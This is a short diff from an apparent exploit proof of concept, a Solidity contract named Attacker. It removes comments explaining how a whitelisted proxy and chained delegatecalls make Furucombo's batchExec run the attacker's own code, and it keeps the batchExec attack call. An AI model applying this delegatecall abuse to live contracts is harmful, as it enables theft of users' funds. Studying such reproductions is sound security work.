@@ -37,11 +37,6 @@ contract Attacker {
             token,
             sender
         );
-        // aaveV2Proxy is whitelisted and passes registry._isValid(aaveV2Proxy)
-        // then delegatecalls to aaveV2Proxy.fallback
-        // which delegatecalls again to its implementation address
-        // which was changed in setup to "this"
-        // meaning furucombo delegatecalls to this.attackDelegated
         furucombo.batchExec(tos, configs, datas);
     }
 
